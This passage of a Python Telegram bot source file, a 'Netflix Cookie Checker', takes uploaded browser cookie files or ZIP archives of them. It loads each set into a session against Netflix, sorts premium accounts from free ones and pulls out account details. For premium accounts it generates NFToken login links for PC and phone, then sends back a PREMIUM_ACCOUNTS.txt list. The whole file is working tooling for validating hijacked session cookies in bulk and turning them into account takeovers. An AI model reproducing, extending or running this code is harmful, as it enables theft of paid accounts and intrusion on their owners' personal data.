        lines.append(f"Email Verified: {email_verified}")
    
    lines.append("")
    lines.append("PROFILES")
    lines.append("-" * 40)
    lines.append(f"Connected Profiles: {profiles_count}")
    lines.append(f"Profiles: {profiles}")
    
    lines.append("")
    lines.append("COOKIE")
    lines.append("-" * 40)
    cookie_single_line = cookie_content.replace('\n', '')
    cookie_single_line = re.sub(r'\s+', '', cookie_single_line)
    lines.append(cookie_single_line)
    
    lines.append("")
    lines.append("FILTERS")
    lines.append("-" * 40)
    lines.append("Account Filter: Premium Only")
    lines.append("Mode: Full Information")
    
    if is_subscribed and nftoken_data and has_usable_nftoken(nftoken_data):
        lines.append("")
        lines.append("NFTOKEN LOGIN LINKS")
        lines.append("-" * 40)
        
        nftoken_mode = get_nftoken_mode(config)
        links = build_nftoken_links(nftoken_data.get("token"), nftoken_mode)
        
        for label, link in links:
            lines.append(f"{label}:")
            lines.append(f"{link}")
            lines.append("")
        
        if nftoken_data.get("expires_at_utc"):
            lines.append(f"Valid Until: {nftoken_data['expires_at_utc']}")
    
    lines.append("")
    lines.append("=" * 60)
    
    return "\n".join(lines)


# ==================== TELEGRAM BOT HANDLERS ====================

def create_progress_bar(percentage, width=30):
    filled = int(width * percentage / 100)
    empty = width - filled
    bar = "█" * filled + "░" * empty
    return f"[{bar}] {percentage:.1f}%"

async def bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    first_name = user.first_name if user.first_name else "User"
    
    welcome_text = f"""
===================================================
              N E T F L I X
           COOKIE CHECKER BOT
                     v{APP_VERSION}
                       By Eyad

            Welcome {first_name}!
===================================================

  WHAT I DO:
     - Verify Netflix cookies
     - Extract premium account details

  HOW TO USE:
     1- Export cookies (.txt or .json)
     2- Send files directly (single or ZIP)
     3- Watch progress bar
     4- Receive PREMIUM_ACCOUNTS.txt

  COMMANDS:
     /start      -> Show menu
     /help       -> Instructions
     /stats      -> Statistics
     /tokenonly  -> Token-only mode
     /fullinfo   -> Full details mode
     /cancel     -> Stop current task

===================================================
     USE THE MENU BUTTON BELOW FOR COMMANDS
===================================================
"""
    await update.message.reply_text(welcome_text)

async def bot_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
===================================================
                 HELP & INSTRUCTIONS
===================================================

  STEP 1: Export Cookies
     Use browser extensions:
     - EditThisCookie
     - Cookie-Editor
     - Get cookies.txt

  STEP 2: Send Files
     - Send single .txt or .json file
     - OR send ZIP archive with multiple files

  STEP 3: Watch Progress
     - Progress bar shows percentage
     - /cancel to stop anytime

  STEP 4: Get Results
     - PREMIUM_ACCOUNTS.txt file
     - Full account details
     - NFToken login links (PC + Phone)

===================================================
     USE THE MENU BUTTON FOR COMMANDS
===================================================
"""
    await update.message.reply_text(help_text)

async def bot_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats_text = f"""
===================================================
                BOT STATISTICS
===================================================

  Total files processed: {stats['total']}
  Valid Premium accounts: {stats['valid']}
  Free accounts: {stats['free']}
  Failed/Invalid: {stats['failed']}
  Currently processing: {stats['processing']}

  Bot is running normally

===================================================
"""
    await update.message.reply_text(stats_text)

async def bot_tokenonly(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'tokenonly'
    await update.message.reply_text("Token Only Mode - ACTIVATED")

async def bot_fullinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['mode'] = 'fullinfo'
    await update.message.reply_text("Full Info Mode - ACTIVATED")

async def bot_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in user_tasks and user_tasks[user_id].get('active', False):
        user_tasks[user_id]['cancel'] = True
        await update.message.reply_text("Cancellation requested")
    else:
        await update.message.reply_text("No active task")

async def handle_single_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    
    user_id = update.effective_user.id
    user_tasks[user_id] = {'active': True, 'cancel': False}
    
    document = update.message.document
    file_name = document.file_name
    
    if document.file_size > 5 * 1024 * 1024:
        await update.message.reply_text("File too large! Max 5MB. Use ZIP for larger collections.")
        user_tasks[user_id]['active'] = False
        return
    
    status_msg = await update.message.reply_text(f"Processing: {file_name}\n\n{create_progress_bar(0)}")
    
    file = await document.get_file()
    content_bytes = BytesIO()
    await file.download_to_memory(content_bytes)
    content = content_bytes.getvalue().decode('utf-8', errors='ignore')
    
    bundles = extract_netflix_cookie_bundles(content)
    
    if bundles:
        cookies = bundles[0].get("cookies", {})
        if has_required_netflix_cookies(cookies):
            await status_msg.edit_text("Connecting to Netflix...")
            session = requests.Session()
            session.cookies.update(cookies)
            response_text, status_code, info = get_account_page(session, None, 15, False)
            
            if status_code == 200 and info and info.get("countryOfSignup"):
                is_subscribed = is_subscribed_account(info)
                config, _ = load_config()
                nftoken_data = None
                nftoken_mode = get_nftoken_mode(config)
                if nftoken_mode != "false" and is_subscribed:
                    nftoken_data, _ = create_nftoken(cookies, 1)
                
                result = format_result_beautiful(info, is_subscribed, content, file_name, nftoken_data, config)
                
                txt_buffer = BytesIO()
                txt_buffer.write(result.encode('utf-8'))
                txt_buffer.seek(0)
                
                await update.message.reply_document(
                    document=txt_buffer,
                    filename=f"result_{int(time.time())}.txt",
                    caption="Account Check Result"
                )
                stats['valid'] += 1 if is_subscribed else 0
                stats['free'] += 0 if is_subscribed else 1
                await status_msg.delete()
            else:
                await status_msg.edit_text(f"Failed: HTTP {status_code}")
                stats['failed'] += 1
        else:
            await status_msg.edit_text("Invalid cookies - NetflixId required")
            stats['failed'] += 1
    else:
        await status_msg.edit_text("No valid cookies found")
        stats['failed'] += 1
    
    stats['total'] += 1
    user_tasks[user_id]['active'] = False

async def handle_zip_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stats
    
    user_id = update.effective_user.id
    user_tasks[user_id] = {'active': True, 'cancel': False}
    
    document = update.message.document
    file_name = document.file_name
    start_time = time.time()

    if document.file_size > 100 * 1024 * 1024:
        await update.message.reply_text("File too large! Max ZIP size is 100MB")
        user_tasks[user_id]['active'] = False
        return

    status_msg = await update.message.reply_text(f"Processing ZIP: {file_name}\n\n{create_progress_bar(0)}")

    file = await document.get_file()
    zip_data = BytesIO()
    await file.download_to_memory(zip_data)

    premium_accounts = []
    free_accounts = 0
    invalid_accounts = 0
    total_files = 0

    try:
        with zipfile.ZipFile(zip_data, 'r') as zf:
            cookie_files = [f for f in zf.namelist() if f.lower().endswith(('.txt', '.json'))]
            total_files = len(cookie_files)

            if not cookie_files:
                await status_msg.edit_text("No cookie files found in ZIP")
                user_tasks[user_id]['active'] = False
                return

            config, _ = load_config()
            mode = context.user_data.get('mode', 'fullinfo')
            processed = 0

            for idx, cookie_filename in enumerate(cookie_files):
                if user_tasks[user_id].get('cancel'):
                    await status_msg.edit_text("Task cancelled")
                    break
                
                try:
                    content = zf.read(cookie_filename).decode('utf-8', errors='ignore')
                    bundles = extract_netflix_cookie_bundles(content)
                    
                    if bundles:
                        cookies = bundles[0].get("cookies", {})
                        if has_required_netflix_cookies(cookies):
                            session = requests.Session()
                            session.cookies.update(cookies)
                            response_text, status_code, info = get_account_page(session, None, 15, False)
                            
                            if status_code == 200 and info and info.get("countryOfSignup"):
                                is_subscribed = is_subscribed_account(info)
                                
                                if is_subscribed:
                                    nftoken_data = None
                                    nftoken_mode = get_nftoken_mode(config)
                                    if nftoken_mode != "false":
                                        nftoken_data, _ = create_nftoken(cookies, 1)
                                    
                                    if mode == 'tokenonly':
                                        email = decode_netflix_value(info.get("email")) or "Unknown"
                                        result = f"Account: {email}\n\nNFToken Login Links:\n---\nPC Login: https://netflix.com/?nftoken={nftoken_data['token']}\nPhone Login: https://netflix.com/unsupported?nftoken={nftoken_data['token']}"
                                        premium_accounts.append(result)
                                    else:
                                        formatted_result = format_result_beautiful(info, is_subscribed, content, cookie_filename, nftoken_data, config)
                                        premium_accounts.append(formatted_result)
                                    premium_accounts.append("\n" + "="*60 + "\n")
                                    stats['valid'] += 1
                                else:
                                    free_accounts += 1
                                    stats['free'] += 1
                            else:
                                invalid_accounts += 1
                                stats['failed'] += 1
                        else:
                            invalid_accounts += 1
                            stats['failed'] += 1
                    else:
                        invalid_accounts += 1
                        stats['failed'] += 1
                    
                    stats['total'] += 1
                    processed += 1
                    
                    percentage = (processed / total_files) * 100
                    await status_msg.edit_text(f"Processing ZIP: {file_name}\nFile: {processed}/{total_files}\n\n{create_progress_bar(percentage)}")
                    
                except Exception as e:
                    invalid_accounts += 1
                    processed += 1
                    print(f"Error: {e}")

        if not user_tasks[user_id].get('cancel'):
            time_taken = time.time() - start_time
            premium_count = len([r for r in premium_accounts if r.startswith(("="*60, "STATUS:", "Account:"))])
            speed = total_files / time_taken if time_taken > 0 else 0

            final_stats_text = f"""
Processing Complete

Final Statistics:
----------------------------------------------------
Total Files: {total_files}

Valid Accounts: {premium_count}
Premium Accounts: {premium_count}
Free Accounts: {free_accounts}
Invalid Accounts: {invalid_accounts}

Time Taken: {time_taken:.2f} seconds
Speed: {speed:.2f} accounts/second
----------------------------------------------------
"""
            await status_msg.delete()
            await update.message.reply_text(final_stats_text)

            if premium_accounts:
                all_results = "\n".join(premium_accounts)
                txt_buffer = BytesIO()
                txt_buffer.write(all_results.encode('utf-8'))
                txt_buffer.seek(0)
                await update.message.reply_document(
                    document=txt_buffer,
                    filename="PREMIUM_ACCOUNTS.txt",
                    caption=f"{premium_count} Valid Premium Accounts Found"
                )
            else:
                await update.message.reply_text("No premium accounts found")

    except Exception as e:
        await status_msg.edit_text(f"Error: {str(e)[:200]}")
    finally:
        user_tasks[user_id]['active'] = False

async def handle_cookie_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    file_name = document.file_name.lower()
    
    if file_name.endswith('.zip'):
        await handle_zip_file(update, context)
    elif file_name.endswith('.txt') or file_name.endswith('.json'):
        await handle_single_file(update, context)
    else:
        await update.message.reply_text("Send .txt, .json, or .zip files")

async def setup_commands(app):
    commands = [
        BotCommand("start", "Show menu"),
        BotCommand("help", "Instructions"),
        BotCommand("stats", "Statistics"),
        BotCommand("tokenonly", "Token only mode"),
        BotCommand("fullinfo", "Full details mode"),
        BotCommand("cancel", "Stop task"),
    ]
    await app.bot.set_my_commands(commands)


# ==================== MAIN ====================

def main():
    create_base_folders()
    
    print("\n" + "="*50)
    print("Netflix Cookie Checker Bot")
    print("="*50)
    print("Bot is starting...")
    print("="*50)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", bot_start))
    app.add_handler(CommandHandler("help", bot_help))
    app.add_handler(CommandHandler("stats", bot_stats))
    app.add_handler(CommandHandler("tokenonly", bot_tokenonly))
    app.add_handler(CommandHandler("fullinfo", bot_fullinfo))
    app.add_handler(CommandHandler("cancel", bot_cancel))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_cookie_file))
    
    import asyncio
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.create_task(setup_commands(app))
        else:
            loop.run_until_complete(setup_commands(app))
    except:
        pass
    
    print("Bot is ready! Send /start on Telegram")
    print("Press Ctrl+C to stop\n")
    
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nBot stopped")
    except Exception as e:
        print(f"\nError: {e}")
